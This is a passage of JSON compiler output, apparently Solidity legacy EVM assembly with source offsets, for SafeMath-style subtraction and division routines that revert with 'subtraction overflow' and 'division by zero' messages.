											"end": 1366,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1358,
											"end": 1401,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 1358,
											"end": 1401,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 1358,
											"end": 1401,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1358,
											"end": 1401,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 1358,
											"end": 1401,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1358,
											"end": 1401,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 1358,
											"end": 1401,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1358,
											"end": 1401,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1358,
											"end": 1401,
											"name": "PUSH",
											"source": 1,
											"value": "1E"
										},
										{
											"begin": 1358,
											"end": 1401,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1358,
											"end": 1401,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1358,
											"end": 1401,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1358,
											"end": 1401,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1358,
											"end": 1401,
											"name": "PUSH",
											"source": 1,
											"value": "536166654D6174683A207375627472616374696F6E206F766572666C6F770000"
										},
										{
											"begin": 1358,
											"end": 1401,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1358,
											"end": 1401,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1358,
											"end": 1401,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1358,
											"end": 1361,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "42"
										},
										{
											"begin": 1358,
											"end": 1401,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1358,
											"end": 1401,
											"name": "tag",
											"source": 1,
											"value": "41"
										},
										{
											"begin": 1358,
											"end": 1401,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1351,
											"end": 1401,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1351,
											"end": 1401,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1274,
											"end": 1408,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 1274,
											"end": 1408,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1274,
											"end": 1408,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1274,
											"end": 1408,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1274,
											"end": 1408,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 3033,
											"end": 3163,
											"name": "tag",
											"source": 1,
											"value": "37"
										},
										{
											"begin": 3033,
											"end": 3163,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 3091,
											"end": 3098,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 3117,
											"end": 3156,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "44"
										},
										{
											"begin": 3121,
											"end": 3122,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 3124,
											"end": 3125,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 3117,
											"end": 3156,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 3117,
											"end": 3156,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 3117,
											"end": 3156,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 3117,
											"end": 3156,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 3117,
											"end": 3156,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 3117,
											"end": 3156,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 3117,
											"end": 3156,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 3117,
											"end": 3156,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 3117,
											"end": 3156,
											"name": "PUSH",
											"source": 1,
											"value": "1A"
										},
										{
											"begin": 3117,
											"end": 3156,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 3117,
											"end": 3156,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 3117,
											"end": 3156,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 3117,
											"end": 3156,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 3117,
											"end": 3156,
											"name": "PUSH",
											"source": 1,
											"value": "536166654D6174683A206469766973696F6E206279207A65726F000000000000"
										},
										{
											"begin": 3117,
											"end": 3156,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 3117,
											"end": 3156,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 3117,
											"end": 3156,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3117,
											"end": 3120,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "45"
										},
										{
											"begin": 3117,
											"end": 3156,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 3117,
											"end": 3156,
											"name": "tag",
											"source": 1,
											"value": "44"
										},
										{
											"begin": 3117,
											"end": 3156,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 3110,
											"end": 3156,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 3110,
											"end": 3156,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3033,
											"end": 3163,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 3033,
											"end": 3163,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 3033,
											"end": 3163,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3033,
											"end": 3163,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3033,
											"end": 3163,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 1692,
											"end": 1879,
											"name": "tag",
											"source": 1,
											"value": "42"
										},
										{
											"begin": 1692,
											"end": 1879,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1778,
											"end": 1785,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1810,
											"end": 1811,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1805,
											"end": 1806,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1805,
											"end": 1811,
											"name": "GT",
											"source": 1
										},
										{
											"begin": 1805,
											"end": 1811,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 1813,
											"end": 1825,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "47"
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "PUSH",
											"source": 1,
											"value": "8C379A000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "tag",
											"source": 1,
											"value": "48"
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "LT",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "50"
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "48"
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "tag",
											"source": 1,
											"value": "50"
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "PUSH",
											"source": 1,
											"value": "1F"
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "51"
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "PUSH",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "PUSH",
											"source": 1,
											"value": "100"
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "EXP",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "NOT",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "tag",
											"source": 1,
											"value": "51"
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "tag",
											"source": 1,
											"value": "47"
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1836,
											"end": 1845,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1852,
											"end": 1853,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1848,
											"end": 1849,
											"name": "DUP6",
											"source": 1
										},
										{
											"begin": 1848,
											"end": 1853,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 1836,
											"end": 1853,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1836,
											"end": 1853,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1871,
											"end": 1872,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1864,
											"end": 1872,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1864,
											"end": 1872,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1864,
											"end": 1872,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1692,
											"end": 1879,
											"name": "SWAP4",
											"source": 1
										},
										{
											"begin": 1692,
											"end": 1879,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 1692,
											"end": 1879,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1692,
											"end": 1879,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1692,
											"end": 1879,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1692,
											"end": 1879,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 3638,
											"end": 3976,
											"name": "tag",
											"source": 1,
											"value": "45"
										},
										{
											"begin": 3638,
											"end": 3976,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 3724,
											"end": 3731,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 3821,
											"end": 3822,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 3817,
											"end": 3818,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 3817,
											"end": 3822,
											"name": "GT",
											"source": 1
										},
										{
											"begin": 3824,
											"end": 3836,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "53"
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "PUSH",
											"source": 1,
											"value": "8C379A000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "tag",
											"source": 1,
											"value": "54"
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "LT",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "56"
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "54"
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "tag",
											"source": 1,
											"value": "56"
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "PUSH",
											"source": 1,
											"value": "1F"
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "57"
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "PUSH",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "PUSH",
											"source": 1,
											"value": "100"
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "EXP",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "NOT",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "tag",
											"source": 1,
											"value": "57"
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "tag",
											"source": 1,
											"value": "53"
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 3809,
											"end": 3837,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3847,
											"end": 3856,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 3863,
											"end": 3864,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 3859,
											"end": 3860,
											"name": "DUP6",
											"source": 1
										},
										{
